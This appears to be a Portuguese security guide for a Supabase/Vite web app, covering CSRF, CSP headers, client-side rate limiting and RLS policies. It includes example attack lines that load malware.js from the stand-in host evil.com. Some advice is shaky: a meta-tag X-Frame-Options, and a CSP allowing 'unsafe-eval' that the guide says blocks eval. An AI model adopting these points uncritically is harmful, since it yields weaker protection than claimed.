# 🛡️ Guia de Segurança - Proteção CSRF e Outras Ameaças

> Última atualização: 2026-01-14
>
> Este documento descreve as medidas de segurança implementadas no sistema para proteção contra CSRF (Cross-Site Request Forgery) e outros ataques comuns.

---

## 📋 Índice

1. [Entendendo CSRF](#entendendo-csrf)
2. [Arquitetura de Segurança](#arquitetura-de-segurança)
3. [Implementações](#implementações)
4. [Como Usar](#como-usar)
5. [Configurações para Produção](#configurações-para-produção)
6. [Testes de Segurança](#testes-de-segurança)

---

## 🎯 Entendendo CSRF

### O que é CSRF?

**Cross-Site Request Forgery (CSRF)** é um ataque onde um site malicioso faz o navegador do usuário executar ações não autorizadas em outro site onde o usuário está autenticado.

### Exemplo de Ataque CSRF:

```html
<!-- Site malicioso: evil.com -->
<img src="https://seusite.com/api/pedidos/criar?item=pizza&preco=0.01" />
```

Se o usuário estiver logado em `seusite.com`, o navegador enviaria cookies de autenticação automaticamente, criando um pedido sem autorização.

### Por que este projeto tem BAIXO risco de CSRF?

Este projeto usa **JWT tokens do Supabase**, que são armazenados em `localStorage` (não em cookies).

**Diferenças importantes:**

| Método | Enviado Automaticamente | Risco CSRF |
|--------|------------------------|------------|
| Cookies de Sessão | ✅ SIM | 🔴 ALTO |
| JWT em localStorage | ❌ NÃO | 🟢 BAIXO |

**Conclusão:** Como tokens JWT precisam ser explicitamente incluídos no header `Authorization`, um site malicioso não consegue fazer o navegador enviá-los automaticamente.

---

## 🏗️ Arquitetura de Segurança

### Camadas de Proteção

```
┌─────────────────────────────────────────┐
│  1. Headers de Segurança (index.html)  │
│  • X-Content-Type-Options               │
│  • X-Frame-Options                      │
│  • X-XSS-Protection                     │
│  • Referrer-Policy                      │
│  • Content-Security-Policy (CSP)        │
└─────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────┐
│  2. Plugin Vite (vite-plugin-security)  │
│  • Injeta CSP no build                  │
│  • Headers no servidor de dev           │
└─────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────┐
│  3. Middleware de Segurança (frontend)  │
│  • Validação de origem                  │
│  • Validação de referer                 │
│  • Rate limiting                        │
│  • Device fingerprinting                │
└─────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────┐
│  4. Supabase Auth + RLS                 │
│  • JWT tokens                           │
│  • Row Level Security                   │
│  • Validação no servidor                │
└─────────────────────────────────────────┘
```

---

## ✅ Implementações

### 1. Headers de Segurança

**Arquivo:** `index.html`

```html
<!-- Previne MIME type sniffing -->
<meta http-equiv="X-Content-Type-Options" content="nosniff" />

<!-- Previne clickjacking -->
<meta http-equiv="X-Frame-Options" content="SAMEORIGIN" />

<!-- Proteção contra XSS -->
<meta http-equiv="X-XSS-Protection" content="1; mode=block" />

<!-- Controle de referer -->
<meta name="referrer" content="strict-origin-when-cross-origin" />
```

### 2. Content Security Policy (CSP)

**Arquivo:** `vite-plugin-security-headers.ts`

O CSP é a **defesa mais poderosa** contra ataques de injeção de código (XSS, etc).

**Políticas configuradas:**

- `default-src 'self'` - Apenas recursos do próprio domínio
- `script-src` - Scripts permitidos (Supabase, Google Maps, QZ Tray)
- `style-src` - Estilos permitidos (Google Fonts)
- `connect-src` - APIs permitidas (Supabase, WhatsApp)
- `img-src` - Imagens de qualquer origem (para produtos)
- `frame-ancestors 'self'` - Previne iframe em outros sites
- `upgrade-insecure-requests` - Force HTTPS

**Exemplo de violação de CSP:**

Se um atacante tentar injetar:
```html
<script src="https://evil.com/malware.js"></script>
```

O navegador **bloqueará automaticamente** porque `evil.com` não está na lista de origens permitidas.

### 3. Middleware de Segurança

**Arquivo:** `src/utils/security.ts`

#### Funções Principais:

**a) Validação de Origem**

```typescript
validateOrigin(window.location.origin)
```

Garante que requests vêm do domínio correto.

**b) Rate Limiting**

```typescript
isRateLimited('user123', 'PEDIDO')
```

Previne múltiplos requests repetidos:

| Operação | Limite | Janela |
|----------|--------|--------|
| PEDIDO | 5 requests | 1 minuto |
| CONFIGURACAO | 10 requests | 1 minuto |
| AUTENTICACAO | 3 tentativas | 5 minutos |
| GERAL | 100 requests | 1 minuto |

**c) Security Middleware**

```typescript
await securityMiddleware('user123', 'PEDIDO')
```

Executa todas as validações em um único ponto:
- ✅ Validação de origem
- ✅ Validação de referer
- ✅ Rate limiting
- ✅ Verificação de autenticação

---

## 🛠️ Como Usar

### Para Operações Críticas

**Exemplo: Criar Pedido**

```typescript
import { securityMiddleware } from '@/utils/security'
import { useError } from '@/contexts/ErrorContext'

async function handleCriarPedido() {
  const { reportError } = useError()

  try {
    // 1. Validações de segurança
    await securityMiddleware(telefoneCliente, 'PEDIDO')

    // 2. Sanitizar dados
    const dadosLimpos = sanitizeCheckoutData(dadosPedido)

    // 3. Salvar no banco
    const pedido = await pedidoService.salvar(dadosLimpos)

    toast.success('Pedido criado com sucesso!')
    return pedido
  } catch (error) {
    if (error.message.includes('Rate limit')) {
      reportError(error, 'WARNING', 'NETWORK')
      toast.error('Muitas tentativas. Aguarde um momento.')
    } else if (error.message.includes('origem')) {
      reportError(error, 'CRITICAL', 'AUTH')
      toast.error('Operação não autorizada.')
    } else {
      reportError(error, 'ERROR', 'DATABASE')
      toast.error('Erro ao criar pedido.')
    }
    throw error
  }
}
```

### Para Configurações de Sistema

```typescript
import { securityMiddleware } from '@/utils/security'

async function handleSalvarConfiguracao(chave: string, valor: string) {
  try {
    // CRÍTICO: Verificar autenticação admin
    const user = await authService.getCurrentUser()
    if (!user || user.role !== 'admin') {
      throw new Error('Apenas administradores podem alterar configurações')
    }

    // Validações de segurança
    await securityMiddleware(user.id, 'CONFIGURACAO')

    // Salvar configuração
    await configuracaoService.atualizar(chave, valor)

    toast.success('Configuração atualizada!')
  } catch (error) {
    console.error('[SECURITY] Tentativa não autorizada:', error)
    toast.error('Operação não permitida.')
  }
}
```

### Funções Auxiliares

```typescript
import {
  validateOrigin,
  validateReferer,
  generateDeviceToken,
  isRateLimited,
  validateTimestamp,
  clearSensitiveData
} from '@/utils/security'

// Validar origem manualmente
if (!validateOrigin(window.location.origin)) {
  console.error('Origem inválida')
}

// Gerar token de dispositivo
const deviceToken = generateDeviceToken()

// Verificar rate limit manual
if (isRateLimited('user123', 'GERAL')) {
  toast.error('Muitas tentativas')
}

// Limpar dados sensíveis (no logout)
function handleLogout() {
  clearSensitiveData()
  authService.logout()
}
```

---

## 🚀 Configurações para Produção

### 1. Atualizar Origens Permitidas

**Arquivo:** `src/utils/security.ts`

```typescript
const ALLOWED_ORIGINS = [
  'https://seudominio.com.br', // ← ADICIONAR DOMÍNIO REAL
  'https://www.seudominio.com.br',
  // Remover localhost em produção
]
```

### 2. Configurar Headers no Servidor

Os headers HTML são um fallback. Para **segurança máxima**, configure headers HTTP no servidor:

#### Netlify (`netlify.toml`):

```toml
[[headers]]
  for = "/*"
  [headers.values]
    X-Content-Type-Options = "nosniff"
    X-Frame-Options = "SAMEORIGIN"
    X-XSS-Protection = "1; mode=block"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
    Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; connect-src 'self' https://*.supabase.co wss://*.supabase.co;"
```

#### Vercel (`vercel.json`):

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "SAMEORIGIN"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        }
      ]
    }
  ]
}
```

#### Nginx:

```nginx
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self';" always;
```

### 3. Configurar CORS no Supabase

No dashboard do Supabase:

1. Vá em **Settings** > **API**
2. Em **CORS Allowed Origins**, adicione:
   - `https://seudominio.com.br`
   - `https://www.seudominio.com.br`
3. **REMOVER** `*` (permitir todos) em produção

### 4. Ativar Row Level Security (RLS)

**CRÍTICO:** Garanta que TODAS as tabelas têm RLS ativo:

```sql
-- Ativar RLS
ALTER TABLE pedidos ENABLE ROW LEVEL SECURITY;
ALTER TABLE configuracoes ENABLE ROW LEVEL SECURITY;

-- Exemplo de política: apenas usuários autenticados podem criar pedidos
CREATE POLICY "Usuários podem criar pedidos"
ON pedidos FOR INSERT
TO authenticated
WITH CHECK (true);

-- Apenas admins podem alterar configurações
CREATE POLICY "Apenas admins podem alterar configurações"
ON configuracoes FOR UPDATE
TO authenticated
USING (auth.jwt() ->> 'role' = 'admin');
```

---

## 🧪 Testes de Segurança

### 1. Testar Headers de Segurança

**Ferramenta:** https://securityheaders.com/

Acesse o site e cole a URL do seu site. Deve retornar **nota A ou superior**.

### 2. Testar CSP

**Console do navegador:**

Abra as DevTools e vá em **Console**. Tente executar:

```javascript
// Isto DEVE ser bloqueado pelo CSP
eval('alert("XSS")')

// Isto também DEVE ser bloqueado
const script = document.createElement('script')
script.src = 'https://evil.com/malware.js'
document.body.appendChild(script)
```

Se o CSP estiver funcionando, você verá erros de violação no console.

### 3. Testar Rate Limiting

```javascript
// Console do navegador
import { isRateLimited } from '@/utils/security'

// Fazer 6 requests rápidos (limite é 5)
for (let i = 0; i < 6; i++) {
  console.log(i, isRateLimited('test', 'PEDIDO'))
}

// Output esperado:
// 0 false
// 1 false
// 2 false
// 3 false
// 4 false
// 5 true ← BLOQUEADO
```

### 4. Testar Validação de Origem

```javascript
import { validateOrigin } from '@/utils/security'

console.log(validateOrigin('https://seudominio.com.br')) // true
console.log(validateOrigin('https://evil.com')) // false
```

### 5. Auditoria de Segurança

**Ferramentas recomendadas:**

1. **Observatory by Mozilla**
   - https://observatory.mozilla.org/
   - Análise completa de headers e configurações

2. **Snyk**
   - https://snyk.io/
   - Vulnerabilidades em dependências

3. **npm audit**
   ```bash
   npm audit
   npm audit fix
   ```

---

## 📊 Checklist de Segurança

### Antes de Deploy

- [ ] Domínio de produção adicionado em `ALLOWED_ORIGINS`
- [ ] Headers HTTP configurados no servidor
- [ ] CORS configurado no Supabase (sem `*`)
- [ ] RLS ativo em todas as tabelas sensíveis
- [ ] Credenciais do Supabase rotacionadas (ver SEGURANCA.md)
- [ ] Variables de ambiente configuradas na hospedagem
- [ ] CSP testado e funcionando
- [ ] Rate limiting testado
- [ ] Testes de segurança executados (SecurityHeaders.com, Observatory)

### Monitoramento Contínuo

- [ ] Logs de erros de segurança (console.error '[SECURITY]')
- [ ] Alertas para múltiplas tentativas falhadas
- [ ] Revisão mensal de dependências (npm audit)
- [ ] Atualização trimestral de bibliotecas
- [ ] Backup semanal do banco de dados

---

## 🆘 Respondendo a Incidentes

Se detectar atividade suspeita:

1. **Identificar**
   - Checar logs do Supabase (Dashboard > Logs)
   - Verificar console do navegador para violações de CSP
   - Analisar padrões de requests (rate limit excedido repetidamente)

2. **Conter**
   - Rotacionar chaves do Supabase imediatamente
   - Forçar logout de todos os usuários
   - Bloquear IPs suspeitos no servidor/Cloudflare

3. **Investigar**
   - Revisar histórico de alterações no banco
   - Verificar tentativas de acesso não autorizadas
   - Analisar logs de erro

4. **Remediar**
   - Aplicar patches de segurança
   - Atualizar políticas RLS se necessário
   - Fortalecer validações

5. **Comunicar**
   - Notificar equipe e stakeholders
   - Documentar o incidente
   - Atualizar procedimentos de segurança

---

## 📚 Recursos Adicionais

### Documentação Oficial
- [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth/row-level-security)

### Ferramentas
- [SecurityHeaders.com](https://securityheaders.com/)
- [Observatory by Mozilla](https://observatory.mozilla.org/)
- [Snyk](https://snyk.io/)
- [OWASP ZAP](https://www.zaproxy.org/)

---

**Mantido por:** Equipe de Desenvolvimento
**Revisão:** Trimestral
**Próxima revisão:** Abril 2026
